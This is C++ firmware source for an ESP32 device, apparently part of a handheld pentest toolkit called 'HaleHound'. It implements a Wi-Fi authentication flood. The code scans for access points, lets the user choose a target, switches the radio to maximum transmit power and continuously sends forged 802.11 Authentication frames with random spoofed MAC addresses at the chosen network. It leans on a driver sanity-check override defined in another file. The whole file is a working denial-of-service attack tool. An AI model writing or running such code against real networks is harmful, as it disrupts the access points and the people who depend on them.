// ═══════════════════════════════════════════════════════════════════════════
// HaleHound Auth Flood — implementation
// Created: 2026-09-18 (T-Embed CC1101 port, roadmap §7 fidelity pass)
// ═══════════════════════════════════════════════════════════════════════════

#include "auth_flood.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include "cyd_config.h"
#include "messaging.h"
#include "radio_manager.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#define AF_MAX_APS         32
#define AF_RESULT_LINE_LEN 40
#define AF_STATUS_INTERVAL_MS 500

// Same shape as deauther.cpp's APInfo — duplicated per this project's own
// stated precedent (see subghz_sentinel.h).
struct APInfo {
    uint8_t bssid[6];
    char ssid[33];
    int rssi;
    uint8_t channel;
};
static APInfo s_apList[AF_MAX_APS];
static int s_apCount = 0;
static int s_selectedAP = -1;

static char s_apLineBuf[AF_MAX_APS][AF_RESULT_LINE_LEN];
static const char *s_apLinePtrs[AF_MAX_APS];

static TaskHandle_t s_workerHandle = NULL;
static QueueHandle_t s_cmdQueue = NULL;
static SemaphoreHandle_t s_doneSem = NULL;

static TaskHandle_t s_txTaskHandle = NULL;
static volatile bool s_txRunning = false;
static volatile bool s_txDone = false;
static volatile uint32_t s_packetCount = 0;
static volatile uint32_t s_successCount = 0;

// 802.11 Authentication frame — identical to wifi_attacks.cpp's
// AuthFlood::auth_frame (Open System, sequence 1 = Request).
static const uint8_t AUTH_FRAME_TEMPLATE[30] = {
    0xB0, 0x00,                         // type/subtype: Authentication
    0x00, 0x00,                         // duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // destination (AP BSSID, filled per-target)
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (random per-packet)
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (AP BSSID, filled per-target)
    0x00, 0x00,                         // fragment & sequence (random per-packet)
    0x00, 0x00,                         // auth algorithm: Open System
    0x01, 0x00,                         // auth sequence: Request
    0x00, 0x00                          // status code: Success
};

static void sendAuthFrame(const uint8_t *bssid) {
    uint8_t frame[sizeof(AUTH_FRAME_TEMPLATE)];
    memcpy(frame, AUTH_FRAME_TEMPLATE, sizeof(frame));
    memcpy(frame + 4, bssid, 6);
    memcpy(frame + 16, bssid, 6);

    for (int i = 0; i < 6; i++) frame[10 + i] = random(0, 256);
    frame[10] = (frame[10] & 0xFE) | 0x02; // locally administered, not multicast

    frame[22] = random(0, 256);
    frame[23] = random(0, 16);

    esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
    s_packetCount++;
    if (res == ESP_OK) s_successCount++;
}

// Raw ESP-IDF APSTA + hidden AP — identical shape to deauther.cpp's
// initAttackMode()/exitAttackMode(), including the explicit stop+deinit
// reset before re-init (see that file for why it's required) and reliance
// on deauther.cpp's global ieee80211_raw_frame_sanity_check() override
// (one C symbol, shared by every raw-TX module linked into this build —
// no separate override needed here).
static void initAttackMode() {
    WiFi.mode(WIFI_OFF);
    delay(50);

    esp_wifi_stop();
    esp_wifi_deinit();
    delay(50);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_APSTA);
    esp_wifi_start();

    wifi_config_t apConfig;
    memset(&apConfig, 0, sizeof(apConfig));
    strncpy((char *)apConfig.ap.ssid, "HaleHound", sizeof(apConfig.ap.ssid));
    apConfig.ap.ssid_len = 9;
    apConfig.ap.ssid_hidden = 1;
    apConfig.ap.max_connection = 0;
    apConfig.ap.authmode = WIFI_AUTH_OPEN;
    apConfig.ap.beacon_interval = 60000;
    esp_wifi_set_config(WIFI_IF_AP, &apConfig);

    esp_wifi_set_max_tx_power(82);
    esp_wifi_set_ps(WIFI_PS_NONE);
}

static void exitAttackMode() {
    esp_wifi_stop();
    esp_wifi_deinit();
    delay(50);
}

// Core 0 tight-loop TX task — ported from AuthFlood::afTxTask(). Channel
// is set once (doesn't change mid-attack, matches the original).
static void authFloodTxTask(void *param) {
    (void)param;

    esp_wifi_set_channel(s_apList[s_selectedAP].channel, WIFI_SECOND_CHAN_NONE);

    int yieldCounter = 0;
    while (s_txRunning) {
        sendAuthFrame(s_apList[s_selectedAP].bssid);

        yieldCounter++;
        if (yieldCounter >= 50) {
            yieldCounter = 0;
            vTaskDelay(1);
        }
    }

    s_txDone = true;
    vTaskDelete(NULL);
}

// ═══════════════════════════════════════════════════════════════════════════
// SCAN PHASE — near-verbatim reuse of deauther.cpp's own scanWorkerTask.
// ═══════════════════════════════════════════════════════════════════════════

static void formatApResults() {
    for (int i = 0; i < s_apCount; i++) {
        const char *ssid = (s_apList[i].ssid[0] != '\0') ? s_apList[i].ssid : "[Hidden]";
        snprintf(s_apLineBuf[i], AF_RESULT_LINE_LEN, "%s CH%d %ddBm",
                 ssid, s_apList[i].channel, s_apList[i].rssi);
        s_apLinePtrs[i] = s_apLineBuf[i];
    }
    if (s_apCount == 0) {
        snprintf(s_apLineBuf[0], AF_RESULT_LINE_LEN, "(no APs found)");
        s_apLinePtrs[0] = s_apLineBuf[0];
        s_apCount = 1;
    }
}

static void scanWorkerTask(void *param) {
    (void)param;

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    WiFi.scanNetworks(true /* async */, true /* show hidden */);

    for (;;) {
        int n = WiFi.scanComplete();
        if (n >= 0) {
            s_apCount = 0;
            for (int i = 0; i < n && s_apCount < AF_MAX_APS; i++) {
                memcpy(s_apList[s_apCount].bssid, WiFi.BSSID(i), 6);
                strncpy(s_apList[s_apCount].ssid, WiFi.SSID(i).c_str(), 32);
                s_apList[s_apCount].ssid[32] = '\0';
                s_apList[s_apCount].rssi = WiFi.RSSI(i);
                s_apList[s_apCount].channel = WiFi.channel(i);
                s_apCount++;
            }
            WiFi.scanDelete();
            WiFi.mode(WIFI_OFF);
            formatApResults();

            RenderMsg msg;
            msg.kind = RENDER_MSG_SCAN_COMPLETE;
            messagingPostTelemetry(msg);
            break;
        }

        Cmd cmd;
        if (xQueueReceive(s_cmdQueue, &cmd, pdMS_TO_TICKS(100)) == pdTRUE && cmd.type == CMD_STOP) {
            WiFi.scanDelete();
            WiFi.mode(WIFI_OFF);
            goto cleanup;
        }
    }

    for (;;) {
        Cmd cmd;
        if (xQueueReceive(s_cmdQueue, &cmd, portMAX_DELAY) == pdTRUE && cmd.type == CMD_STOP) {
            break;
        }
    }

cleanup:
    radioRelease(RADIO_WIFI);
    xSemaphoreGive(s_doneSem);
    vTaskDelete(NULL);
}

void authFloodScanStart() {
    if (!radioAcquire(RADIO_WIFI)) {
        #if CYD_DEBUG
        Serial.println("[AUTH_FLOOD] ERROR: could not acquire radio for scan");
        #endif
        return;
    }

    s_apCount = 0;
    s_selectedAP = -1;
    s_cmdQueue = messagingCreateCmdQueue();
    s_doneSem = xSemaphoreCreateBinary();

    xTaskCreatePinnedToCore(scanWorkerTask, "authflood_scan", 6144, NULL, 2, &s_workerHandle, 0);
}

void authFloodScanStop() {
    if (!s_cmdQueue) return;

    Cmd cmd;
    cmd.type = CMD_STOP;
    xQueueSend(s_cmdQueue, &cmd, portMAX_DELAY);
    xSemaphoreTake(s_doneSem, portMAX_DELAY);

    vQueueDelete(s_cmdQueue);
    vSemaphoreDelete(s_doneSem);
    s_cmdQueue = NULL;
    s_doneSem = NULL;
    s_workerHandle = NULL;
}

const char *const *authFloodGetApResultLines() {
    return s_apLinePtrs;
}

int authFloodGetApResultCount() {
    return s_apCount;
}

// ═══════════════════════════════════════════════════════════════════════════
// ATTACK PHASE
// ═══════════════════════════════════════════════════════════════════════════

static void attackWorkerTask(void *param) {
    (void)param;

    s_packetCount = 0;
    s_successCount = 0;

    initAttackMode();

    s_txDone = false;
    s_txRunning = true;
    xTaskCreatePinnedToCore(authFloodTxTask, "authflood_tx", 4096, NULL, 1, &s_txTaskHandle, 0);

    uint32_t lastStatus = 0;

    for (;;) {
        Cmd cmd;
        if (xQueueReceive(s_cmdQueue, &cmd, pdMS_TO_TICKS(100)) == pdTRUE && cmd.type == CMD_STOP) {
            break;
        }

        uint32_t now = millis();
        if (now - lastStatus >= AF_STATUS_INTERVAL_MS) {
            lastStatus = now;
            uint32_t pkts = s_packetCount;
            uint32_t ok = s_successCount;
            float rate = (pkts > 0) ? ((float)ok / pkts * 100.0f) : 0.0f;

            RenderMsg msg;
            msg.kind = RENDER_MSG_STATUS_TEXT;
            snprintf(msg.payload.text, RENDER_MSG_TEXT_MAX, "CH%d TX:%lu OK:%.0f%%",
                     s_apList[s_selectedAP].channel, (unsigned long)pkts, rate);
            messagingPostTelemetry(msg);
        }
    }

    s_txRunning = false;
    uint32_t waitStart = millis();
    while (!s_txDone && (millis() - waitStart < 500)) {
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    s_txTaskHandle = NULL;

    exitAttackMode();
    WiFi.mode(WIFI_OFF);
    delay(50);

    radioRelease(RADIO_WIFI);
    xSemaphoreGive(s_doneSem);
    vTaskDelete(NULL);
}

void authFloodSelectTarget(int index) {
    if (index < 0 || index >= s_apCount) return;
    s_selectedAP = index;

    if (!radioAcquire(RADIO_WIFI)) {
        #if CYD_DEBUG
        Serial.println("[AUTH_FLOOD] ERROR: could not acquire radio for attack");
        #endif
        return;
    }

    s_cmdQueue = messagingCreateCmdQueue();
    s_doneSem = xSemaphoreCreateBinary();

    xTaskCreatePinnedToCore(attackWorkerTask, "authflood_atk", 4096, NULL, 2, &s_workerHandle, 0);
}

void authFloodAttackStop() {
    if (!s_cmdQueue) return;

    Cmd cmd;
    cmd.type = CMD_STOP;
    xQueueSend(s_cmdQueue, &cmd, portMAX_DELAY);
    xSemaphoreTake(s_doneSem, portMAX_DELAY);

    vQueueDelete(s_cmdQueue);
    vSemaphoreDelete(s_doneSem);
    s_cmdQueue = NULL;
    s_doneSem = NULL;
    s_workerHandle = NULL;
}
